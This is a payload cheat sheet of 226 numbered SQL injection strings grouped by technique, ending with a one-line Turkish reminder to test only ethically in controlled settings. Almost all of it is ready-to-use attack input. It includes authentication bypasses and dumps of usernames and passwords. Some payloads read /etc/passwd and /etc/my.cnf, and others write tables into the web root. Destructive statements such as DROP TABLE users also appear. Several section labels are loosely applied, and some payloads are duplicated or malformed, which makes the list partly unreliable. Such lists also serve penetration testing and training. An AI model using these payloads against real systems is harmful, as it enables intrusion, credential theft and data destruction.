## SQL Injection Payloads

### Basic SQL Injection
1. `' OR '1'='1`
2. `' OR '1'='1' --`
3. `' OR 1=1 --`
4. `' OR 1=1 #`
5. `' OR 'a'='a'`
6. `' OR 'a'='a' --`
7. `' OR 'a'='a' #`
8. `' OR 'x'='x'`
9. `' OR 'x'='x' --`
10. `' OR 1=1 /*`
11. `' OR 1=1 --+`
12. `' OR '1'='1' /*`
13. `' OR '1'='1' --+`
14. `' OR 1=1#`
15. `' OR '1'='1' --`
16. `' OR '1'='1' /*+`
17. `' OR 'admin'='admin'`
18. `' OR 1=1; --`
19. `' OR 1=1; --+`
20. `' OR 1=2; --`

### Union-Based SQL Injection
21. `' UNION ALL SELECT NULL, NULL, NULL--`
22. `' UNION SELECT username, password FROM users--`
23. `' UNION ALL SELECT table_name, column_name FROM information_schema.columns--`
24. `' UNION SELECT 1, version()--`
25. `' UNION ALL SELECT load_file('/etc/passwd')--`
26. `' UNION SELECT NULL, user()--`
27. `' UNION ALL SELECT 1, database()--`
28. `' UNION ALL SELECT concat(username, 0x3a, password) FROM users--`
29. `' UNION SELECT 1, 2, 3, 4, 5--`
30. `' UNION SELECT table_name FROM information_schema.tables--`
31. `' UNION ALL SELECT schema_name FROM information_schema.schemata--`
32. `' UNION ALL SELECT column_name FROM information_schema.columns--`
33. `' UNION ALL SELECT null, null, null--`
34. `' UNION ALL SELECT 1, 2, (SELECT user())--`
35. `' UNION SELECT 1, database()--`
36. `' UNION ALL SELECT null, @@version--`
37. `' UNION ALL SELECT 1, (SELECT table_name FROM information_schema.tables)--`
38. `' UNION SELECT 1, (SELECT GROUP_CONCAT(user()) FROM mysql.user)--`
39. `' UNION SELECT 1, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)--`
40. `' UNION ALL SELECT 1, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')--`

### Error-Based SQL Injection
41. `' AND 1=CONVERT(int, (SELECT @@version))--`
42. `' AND 1=CONVERT(int, (SELECT user()))--`
43. `' AND 1=CONVERT(int, (SELECT version()))--`
44. `' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--`
45. `' AND 1=CONVERT(int, (SELECT column_name FROM information_schema.columns WHERE table_name='users'))--`
46. `' AND 1=CONVERT(int, (SELECT load_file('/etc/passwd')))--`
47. `' AND 1=CONVERT(int, (SELECT concat(username, ':', password) FROM users))--`
48. `' AND 1=CONVERT(int, (SELECT schema_name FROM information_schema.schemata))--`
49. `' AND 1=CONVERT(int, (SELECT database()))--`
50. `' AND 1=CONVERT(int, (SELECT user()))--`

### Time-Based SQL Injection
51. `' OR IF(1=1, SLEEP(5), 0)--`
52. `' OR IF(1=2, SLEEP(5), 0)--`
53. `' OR IF(1=1, BENCHMARK(1000000, MD5('test')), 0)--`
54. `' OR IF(1=2, BENCHMARK(1000000, MD5('test')), 0)--`
55. `' OR IF(LENGTH(@@version) > 10, SLEEP(5), 0)--`
56. `' OR IF((SELECT COUNT(*) FROM users) > 5, SLEEP(5), 0)--`
57. `' OR IF((SELECT LENGTH(@@version)) = 10, SLEEP(5), 0)--`
58. `' OR IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 10, SLEEP(5), 0)--`
59. `' OR IF((SELECT LENGTH(@@version)) BETWEEN 5 AND 20, SLEEP(5), 0)--`
60. `' OR IF((SELECT LENGTH(@@version)) NOT BETWEEN 5 AND 20, SLEEP(5), 0)--`

### Blind SQL Injection
61. `' AND 1=IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)--`
62. `' AND 1=IF((SELECT LENGTH(@@version)) = 10, SLEEP(5), 0)--`
63. `' AND 1=IF((SELECT COUNT(*) FROM information_schema.tables) > 5, SLEEP(5), 0)--`
64. `' AND 1=IF((SELECT LENGTH(@@version)) BETWEEN 5 AND 20, SLEEP(5), 0)--`
65. `' AND 1=IF((SELECT LENGTH(@@version)) NOT BETWEEN 5 AND 20, SLEEP(5), 0)--`
66. `' AND 1=IF(1=1, SLEEP(5), 0)--`
67. `' AND 1=IF(1=2, SLEEP(5), 0)--`
68. `' AND 1=IF((SELECT COUNT(*) FROM users) < 5, SLEEP(5), 0)--`
69. `' AND 1=IF((SELECT LENGTH(@@version)) != 10, SLEEP(5), 0)--`
70. `' AND 1=IF((SELECT COUNT(*) FROM information_schema.tables) < 10, SLEEP(5), 0)--`

### Out-of-Band SQL Injection
71. `' OR 1=1; SELECT * FROM users INTO OUTFILE '/var/www/html/users.txt'--`
72. `' OR 1=1; SELECT * FROM users INTO OUTFILE '/var/www/html/test.txt' FIELDS TERMINATED BY ','--`
73. `' OR 1=1; SELECT * FROM users INTO OUTFILE '/tmp/users.txt'--`
74. `' OR 1=1; SELECT * FROM users INTO OUTFILE '/tmp/test.txt' FIELDS TERMINATED BY '|'--`
75. `' OR 1=1; SELECT * FROM users INTO OUTFILE '/var/www/html/data.csv' FIELDS TERMINATED BY ',' ENCLOSED BY '"'--`
76. `' OR 1=1; SELECT @@version INTO OUTFILE '/tmp/version.txt'--`
77. `' OR 1=1; SELECT user() INTO OUTFILE '/tmp/user.txt'--`
78. `' OR 1=1; SELECT table_name FROM information_schema.tables INTO OUTFILE '/tmp/tables.txt'--`
79. `' OR 1=1; SELECT column_name FROM information_schema.columns WHERE table_name='users' INTO OUTFILE '/tmp/columns.txt'--`
80. `' OR 1=1; SELECT COUNT(*) FROM users INTO OUTFILE '/tmp/count.txt'--`

### Advanced SQL Injection
81. `' UNION ALL SELECT 1, GROUP_CONCAT(user()) FROM mysql.user--`
82. `' UNION ALL SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--`
83. `' UNION ALL SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--`
84. `' UNION ALL SELECT 1, LOAD_FILE('/etc/passwd')--`
85. `' UNION ALL SELECT 1, LOAD_FILE('/etc/my.cnf')--`
86. `' UNION ALL SELECT 1, @@version--`
87. `' UNION ALL SELECT 1, (SELECT GROUP_CONCAT(user()) FROM mysql.user)--`
88. `' UNION ALL SELECT 1, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())--`
89. `' UNION ALL SELECT 1, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')--`
90. `' UNION ALL SELECT 1, (SELECT LOAD_FILE('/etc/passwd'))--`
91. `' UNION ALL SELECT 1, (SELECT LOAD_FILE('/etc/my.cnf'))--`
92. `' UNION ALL SELECT 1, (SELECT @@version)--`
93. `' UNION ALL SELECT 1, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')--`
94. `' UNION ALL SELECT 1, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())--`
95. `' UNION ALL SELECT 1, (SELECT GROUP_CONCAT(user()) FROM mysql.user)--`
96. `' UNION ALL SELECT 1, (SELECT SUBSTRING(@@version, 1, 1))--`
97. `' UNION ALL SELECT 1, (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--`
98. `' UNION ALL SELECT 1, (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')--`
99. `' UNION ALL SELECT 1, (SELECT IFNULL(SUBSTRING(@@version, 1, 1), 'NULL'))--`
100. `' UNION ALL SELECT 1, (SELECT IFNULL(GROUP_CONCAT(user()), 'NULL'))--`

### Multiple-Parameter SQL Injection
101. `' OR 1=1 AND 1=1--`
102. `' OR 1=1 AND 'x'='x'--`
103. `' OR 'a'='a' AND '1'='1'--`
104. `' OR '1'='1' AND '1'='1'--`
105. `' OR 'a'='a' AND 'x'='x'--`
106. `' OR 1=1 AND 2=2--`
107. `' OR 'x'='x' AND 1=1--`
108. `' OR '1'='1' AND 1=2--`
109. `' OR 'a'='a' AND '1'='2'--`
110. `' OR '1'='1' AND 'x'='x'--`
111. `' OR 'a'='a' AND 1=1--`
112. `' OR 1=1 AND 'a'='a'--`
113. `' OR '1'='1' AND 'a'='b'--`
114. `' OR 1=1 AND '1'='1'--`
115. `' OR 'x'='x' AND 2=2--`
116. `' OR '1'='1' AND 2=2--`
117. `' OR 1=1 AND 'b'='b'--`
118. `' OR 'x'='x' AND 1=2--`
119. `' OR 1=1 AND 'b'='c'--`
120. `' OR 'a'='a' AND '2'='2'--`

### Second-Order SQL Injection
121. `'; DROP TABLE users--`
122. `'; INSERT INTO users (username, password) VALUES ('admin', 'admin')--`
123. `'; UPDATE users SET password='password' WHERE username='admin'--`
124. `'; DELETE FROM users WHERE username='admin'--`
125. `'; SELECT * FROM users WHERE username='admin'--`
126. `'; SELECT * FROM users WHERE username='test' AND password='password'--`
127. `'; INSERT INTO logs (message) VALUES ('Injection test')--`
128. `'; UPDATE logs SET message='Injected' WHERE id=1--`
129. `'; DELETE FROM logs WHERE id=1--`
130. `'; SELECT * FROM logs--`

### XML-Based SQL Injection
131. `' OR 1=1 UNION SELECT 1, concat(username, ':', password) FROM users--`
132. `' OR 1=1 UNION SELECT 1, concat(email, ':', password) FROM users--`
133. `' OR 1=1 UNION SELECT 1, concat(id, ':', password) FROM users--`
134. `' OR 1=1 UNION SELECT 1, concat(first_name, ':', last_name) FROM employees--`
135. `' OR 1=1 UNION SELECT 1, concat(name, ':', description) FROM products--`
136. `' OR 1=1 UNION SELECT 1, concat(first_name, ' ', last_name) FROM customers--`
137. `' OR 1=1 UNION SELECT 1, concat(id, ':', balance) FROM accounts--`
138. `' OR 1=1 UNION SELECT 1, concat(phone, ':', address) FROM contacts--`
139. `' OR 1=1 UNION SELECT 1, concat(order_id, ':', status) FROM orders--`
140. `' OR 1=1 UNION SELECT 1, concat(user_id, ':', points) FROM rewards--`

### Mixed SQL Injection
141. `' UNION SELECT NULL, NULL, version()--`
142. `' OR (SELECT COUNT(*) FROM users) > 1--`
143. `' OR (SELECT 1 FROM dual WHERE 1=1)--`
144. `' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--`
145. `' OR NOT EXISTS(SELECT 1 FROM users WHERE username='admin')--`
146. `' OR (SELECT 1 UNION SELECT 2)--`
147. `' OR 1 IN (SELECT user())--`
148. `' OR 1 IN (SELECT table_name FROM information_schema.tables)--`
149. `' OR 1 IN (SELECT column_name FROM information_schema.columns)--`
150. `' OR 1 IN (SELECT load_file('/etc/passwd'))--`

### Miscellaneous SQL Injection
151. `' OR (SELECT 1) UNION SELECT 1, 2--`
152. `' OR (SELECT 1) UNION ALL SELECT 1, 2--`
153. `' OR (SELECT user()) UNION SELECT 1, 2--`
154. `' OR (SELECT database()) UNION SELECT 1, 2--`
155. `' OR (SELECT table_name FROM information_schema.tables) UNION SELECT 1, 2--`
156. `' OR (SELECT column_name FROM information_schema.columns) UNION SELECT 1, 2--`
157. `' OR (SELECT COUNT(*) FROM users) UNION SELECT 1, 2--`
158. `' OR (SELECT LOAD_FILE('/etc/passwd')) UNION SELECT 1, 2--`
159. `' OR (SELECT @@version) UNION SELECT 1, 2--`
160. `' OR (SELECT IF(1=1, 'True', 'False')) UNION SELECT 1, 2--`

### Advanced Injection
161. `' OR 1=1 HAVING 1=1--`
162. `' OR 1=1 GROUP BY CONCAT(username, ':', password) HAVING 1=1--`
163. `' OR 1=1 ORDER BY 1--`
164. `' OR 1=1 ORDER BY 2--`
165. `' OR 1=1 ORDER BY 3--`
166. `' OR 1=1 ORDER BY 4--`
167. `' OR 1=1 ORDER BY 5--`
168. `' OR 1=1 ORDER BY 6--`
169. `' OR 1=1 ORDER BY 7--`
170. `' OR 1=1 ORDER BY 8--`
171. `' OR 1=1 LIMIT 1--`
172. `' OR 1=1 LIMIT 2--`
173. `' OR 1=1 LIMIT 3--`
174. `' OR 1=1 LIMIT 4--`
175. `' OR 1=1 LIMIT 5--`
176. `' OR 1=1 LIMIT 6--`
177. `' OR 1=1 LIMIT 7--`
178. `' OR 1=1 LIMIT 8--`
179. `' OR 1=1 LIMIT 9--`
180. `' OR 1=1 LIMIT 10--`

### Parameterized Injection
181. `' UNION SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT USER()), 0x3a, (SELECT DATABASE()))) AS result)--`
182. `' UNION ALL SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x3a, (SELECT DATABASE()))) AS result)--`
183. `' UNION SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TABLE_NAME FROM information_schema.tables), 0x3a, (SELECT COLUMN_NAME FROM information_schema.columns))) AS result)--`
184. `' UNION SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT LOAD_FILE('/etc/passwd')), 0x3a, (SELECT DATABASE()))) AS result)--`
185. `' UNION ALL SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT GROUP_CONCAT(user())), 0x3a, (SELECT DATABASE()))) AS result)--`
186. `' UNION SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT SUBSTRING(@@version, 1, 10)), 0x3a, (SELECT DATABASE()))) AS result)--`
187. `' UNION ALL SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT GROUP_CONCAT(table_name)), 0x3a, (SELECT DATABASE()))) AS result)--`
188. `' UNION ALL SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT GROUP_CONCAT(column_name)), 0x3a, (SELECT DATABASE()))) AS result)--`
189. `' UNION SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT LOAD_FILE('/etc/my.cnf')), 0x3a, (SELECT DATABASE()))) AS result)--`
190. `' UNION ALL SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x3a, (SELECT GROUP_CONCAT(user()))) AS result)--`

### Non-Standard SQL Injection
191. `' OR '1'='1' /*+`
192. `' OR '1'='1' --+`
193. `' OR 1=1/*+`
194. `' OR 1=1--+`
195. `' OR 'a'='a'/*+`
196. `' OR 'a'='a'--+`
197. `' OR 'a'='a'--+`
198. `' OR 1=1/*+`
199. `' OR 1=1--+`
200. `' OR 1=1'--+`
201. `' OR 1=1'/*+`
202. `' OR 1=1'/*+`
203. `' OR 1=1--+`
204. `' OR '1'='1'--+`
205. `' OR 1=1/*+`
206. `' OR 1=1--+`

## SQL Injection for Authentication Bypass
207. `' OR ''='`
208. `' OR '1'='1`
209. `' OR 1=1--`
210. `' OR 1=1#`
211. `' OR 'a'='a`
212. `' OR 1=1--+`
213. `' OR 1=1/*`
214. `' OR '1'='1'--`
215. `' OR '1'='1'/*`
216. `' OR '1'='1'--+`
217. `' OR '1'='1'/*+`
218. `' OR 1=1/*+`
219. `' OR 1=1/*`
220. `' OR 'a'='a'--`
221. `' OR 'a'='a'/*`
222. `' OR 'a'='a'--+`
223. `' OR 'a'='a'/*+`
224. `' OR 1=1--+`
225. `' OR 1=1'--`
226. `' OR 1=1'/*+`

Bu payloadlar genellikle SQL enjeksiyon saldırılarında kullanılır ve veritabanı, uygulama güvenlik açıklarına bağlı olarak farklı etkilere sahip olabilir. Kontrollü bir ortamda test yaptığınızdan ve etik kurallara uyduğunuzdan emin olun.
